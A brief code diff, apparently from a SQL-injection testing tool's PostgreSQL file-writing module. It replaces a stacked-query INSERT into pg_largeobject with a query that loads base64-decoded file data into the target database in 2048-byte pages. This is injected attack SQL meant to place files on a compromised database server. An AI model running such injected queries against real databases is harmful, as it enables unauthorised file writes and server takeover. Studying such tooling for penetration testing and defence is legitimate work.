@@ -98,7 +98,8 @@ class Filesystem(GenericFilesystem):
         banVer = kb.bannerFp["dbmsVersion"]
 
         if banVer >= "9.0":
-            inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, 0, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.tblField, self.fileTblName))
+            #inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, 0, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.tblField, self.fileTblName))
+            inject.goStacked("insert into pg_largeobject (loid,data,pageno) (select %d, substring((select decode(%s,'base64') from %s) from n for 2048), (row_number() over () - 1) as rnum from generate_series(1, length((select decode(%s,'base64') from %s)), 2048) n);" % (self.oid, self.tblField, self.fileTblName, self.tblField, self.fileTblName))
         else:
             inject.goStacked("UPDATE pg_largeobject SET data=(DECODE((SELECT %s FROM %s), 'base64')) WHERE loid=%d" % (self.tblField, self.fileTblName, self.oid))
 
